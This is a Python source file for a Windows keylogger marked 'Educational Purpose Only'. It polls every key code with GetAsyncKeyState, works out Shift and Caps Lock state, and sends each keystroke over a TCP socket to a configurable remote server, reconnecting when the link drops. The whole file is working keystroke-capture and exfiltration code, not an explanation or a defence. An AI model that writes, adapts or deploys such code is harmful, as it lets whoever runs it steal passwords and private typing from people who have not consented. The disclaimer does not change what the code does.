"""
Keylogger - Educational Purpose Only
Captures keystrokes and sends them to a remote server.
WARNING: Use only with explicit permission on systems you own.
"""

import socket
import ctypes
import time
import logging
import sys
import json
import os
from pathlib import Path

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('keylogger.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Constants for Windows API
KEY_PRESSED = 0x8000
CAPS_LOCK_ON = 0x0001
VK_CAPITAL = 0x14  # Caps Lock key code
VK_SHIFT = 0x10    # Shift key code
VK_LSHIFT = 0xA0   # Left Shift
VK_RSHIFT = 0xA1   # Right Shift

# Default configuration
DEFAULT_CONFIG = {
    'server_address': '127.0.0.1',
    'server_port': 9000,
    'reconnect_delay': 5,
    'max_reconnect_attempts': 10,
    'poll_interval': 0.01  # 10 milliseconds
}

# Load user32.dll for Windows API calls
user32 = ctypes.windll.user32


def load_config():
    """Load configuration from config.json or use defaults."""
    config_path = Path('config.json')
    if config_path.exists():
        try:
            with open(config_path, 'r') as f:
                config = json.load(f)
                logger.info("Configuration loaded from config.json")
                return {**DEFAULT_CONFIG, **config}
        except Exception as e:
            logger.warning(f"Failed to load config.json: {e}. Using defaults.")
    else:
        logger.info("No config.json found. Using default configuration.")
        # Create default config file
        try:
            with open(config_path, 'w') as f:
                json.dump(DEFAULT_CONFIG, f, indent=4)
            logger.info("Created default config.json")
        except Exception as e:
            logger.warning(f"Failed to create config.json: {e}")
    
    return DEFAULT_CONFIG


def get_key(code, shift_pressed=False):
    """
    Get the readable key name from the key code.
    
    Args:
        code: The virtual key code as a string
        shift_pressed: Whether Shift key is currently pressed
        
    Returns:
        String representation of the key
    """
    # Base ASCII table for keys without Shift
    ascii_table = {
        "1": "1", "2": "2", "3": "3", "4": "4", "5": "5",
        "6": "6", "7": "7", "8": "8", "9": "9", "0": "0",
        "8": "[BACKSPACE]", "9": "[TAB]", "13": "[ENTER]",
        "16": "[SHIFT]", "17": "[CTRL]", "18": "[ALT]",
        "19": "[PAUSE]", "20": "[CAPSLOCK]", "27": "[ESC]",
        "32": " ", "33": "[PAGEUP]", "34": "[PAGEDOWN]",
        "35": "[END]", "36": "[HOME]", "37": "[LEFT]",
        "38": "[UP]", "39": "[RIGHT]", "40": "[DOWN]",
        "44": "[PRTSC]", "45": "[INSERT]", "46": "[DELETE]",
        "48": "0", "49": "1", "50": "2", "51": "3", "52": "4",
        "53": "5", "54": "6", "55": "7", "56": "8", "57": "9",
        "65": "A", "66": "B", "67": "C", "68": "D", "69": "E",
        "70": "F", "71": "G", "72": "H", "73": "I", "74": "J",
        "75": "K", "76": "L", "77": "M", "78": "N", "79": "O",
        "80": "P", "81": "Q", "82": "R", "83": "S", "84": "T",
        "85": "U", "86": "V", "87": "W", "88": "X", "89": "Y",
        "90": "Z", "91": "[WIN]", "92": "[WIN]", "93": "[MENU]",
        "96": "0", "97": "1", "98": "2", "99": "3", "100": "4",
        "101": "5", "102": "6", "103": "7", "104": "8", "105": "9",
        "106": "*", "107": "+", "109": "-", "110": ".", "111": "/",
        "112": "[F1]", "113": "[F2]", "114": "[F3]", "115": "[F4]",
        "116": "[F5]", "117": "[F6]", "118": "[F7]", "119": "[F8]",
        "120": "[F9]", "121": "[F10]", "122": "[F11]", "123": "[F12]",
        "144": "[NUMLOCK]", "145": "[SCROLLLOCK]",
        "160": "[LSHIFT]", "161": "[RSHIFT]",
        "162": "[LCTRL]", "163": "[RCTRL]",
        "164": "[LALT]", "165": "[RALT]",
        "186": ";", "187": "=", "188": ",", "189": "-",
        "190": ".", "191": "/", "192": "`",
        "219": "[", "220": "\\", "221": "]", "222": "'"
    }
    
    # Shift mappings for special characters
    shift_table = {
        "48": ")", "49": "!", "50": "@", "51": "#", "52": "$",
        "53": "%", "54": "^", "55": "&", "56": "*", "57": "(",
        "186": ":", "187": "+", "188": "<", "189": "_",
        "190": ">", "191": "?", "192": "~",
        "219": "{", "220": "|", "221": "}", "222": "\""
    }
    
    try:
        if shift_pressed and code in shift_table:
            return shift_table[code]
        return ascii_table.get(code, "")
    except KeyError:
        return ""


def is_shift_pressed():
    """Check if either Shift key is currently pressed."""
    return (user32.GetAsyncKeyState(VK_LSHIFT) & KEY_PRESSED != 0 or
            user32.GetAsyncKeyState(VK_RSHIFT) & KEY_PRESSED != 0)


def is_caps_lock_on():
    """Check if Caps Lock is currently on."""
    return user32.GetKeyState(VK_CAPITAL) & CAPS_LOCK_ON != 0


def apply_case_logic(key, shift_pressed, caps_lock_on):
    """
    Apply proper case logic based on Shift and Caps Lock states.
    
    Args:
        key: The key character
        shift_pressed: Whether Shift is pressed
        caps_lock_on: Whether Caps Lock is on
        
    Returns:
        Properly cased key character
    """
    # Only apply case logic to alphabetic characters
    if len(key) == 1 and key.isalpha():
        # XOR logic: uppercase if exactly one of (Shift, CapsLock) is active
        if shift_pressed ^ caps_lock_on:
            return key.upper()
        else:
            return key.lower()
    return key


def connect_to_server(config):
    """
    Establish connection to the server with retry logic.
    
    Args:
        config: Configuration dictionary
        
    Returns:
        Connected socket or None if failed
    """
    server_address = (config['server_address'], config['server_port'])
    max_attempts = config['max_reconnect_attempts']
    delay = config['reconnect_delay']
    
    for attempt in range(1, max_attempts + 1):
        try:
            logger.info(f"Attempting to connect to {server_address[0]}:{server_address[1]} (Attempt {attempt}/{max_attempts})")
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.settimeout(10)  # 10 second timeout
            client_socket.connect(server_address)
            logger.info("Successfully connected to server")
            return client_socket
        except socket.error as e:
            logger.error(f"Connection failed: {e}")
            if attempt < max_attempts:
                logger.info(f"Retrying in {delay} seconds...")
                time.sleep(delay)
            else:
                logger.error("Max reconnection attempts reached")
                return None
        except Exception as e:
            logger.error(f"Unexpected error during connection: {e}")
            return None
    
    return None


def send_keystroke(client_socket, key):
    """
    Send keystroke to server with error handling.
    
    Args:
        client_socket: The socket connection (or None)
        key: The key to send
        
    Returns:
        True if successful, False otherwise
    """
    if client_socket is None:
        return False
    
    try:
        if key:  # Only send non-empty keys
            client_socket.sendall(key.encode('utf-8'))
            return True
    except socket.error as e:
        logger.error(f"Failed to send keystroke: {e}")
        return False
    except Exception as e:
        logger.error(f"Unexpected error sending keystroke: {e}")
        return False
    return True


def main():
    """Main function to capture and send keystrokes."""
    logger.info("Keylogger starting...")
    
    # Load configuration
    config = load_config()
    
    # Connect to server
    client_socket = connect_to_server(config)
    if not client_socket:
        logger.error("Failed to establish connection. Exiting.")
        sys.exit(1)
    
    # Dictionary to store the state of each key
    key_states = {}
    
    try:
        while True:
            try:
                # Check Shift and Caps Lock states once per iteration
                shift_pressed = is_shift_pressed()
                caps_lock_on = is_caps_lock_on()
                
                # Iterate through all possible key codes (0-255)
                for i in range(256):
                    # Check if the key is pressed
                    if user32.GetAsyncKeyState(i) & KEY_PRESSED != 0:
                        # If the key was not previously pressed
                        if not key_states.get(i, False):
                            key_states[i] = True  # Update the state to pressed
                            
                            # Get the readable key name
                            key = get_key(str(i), shift_pressed)
                            
                            # Apply case logic for alphabetic characters
                            key = apply_case_logic(key, shift_pressed, caps_lock_on)
                            
                            # Send the key to the server
                            if not send_keystroke(client_socket, key):
                                # Connection lost, attempt to reconnect
                                logger.warning("Connection lost. Attempting to reconnect...")
                                if client_socket is not None:
                                    try:
                                        client_socket.close()
                                    except Exception:
                                        pass
                                client_socket = connect_to_server(config)
                                if not client_socket:
                                    logger.error("Reconnection failed. Exiting.")
                                    sys.exit(1)
                    else:
                        # Update the state to not pressed
                        key_states[i] = False
                
                # Sleep for configured interval to reduce CPU usage (default 10 milliseconds)
                time.sleep(config['poll_interval'])
                
            except KeyboardInterrupt:
                logger.info("Keyboard interrupt received. Shutting down...")
                break
            except Exception as e:
                logger.error(f"Error in main loop: {e}")
                time.sleep(1)  # Brief pause before continuing
                
    finally:
        # Clean up resources
        if client_socket:
            try:
                client_socket.close()
                logger.info("Socket closed")
            except Exception as e:
                logger.error(f"Error closing socket: {e}")
        logger.info("Keylogger stopped")


if __name__ == "__main__":
    main()

# Made with Bob
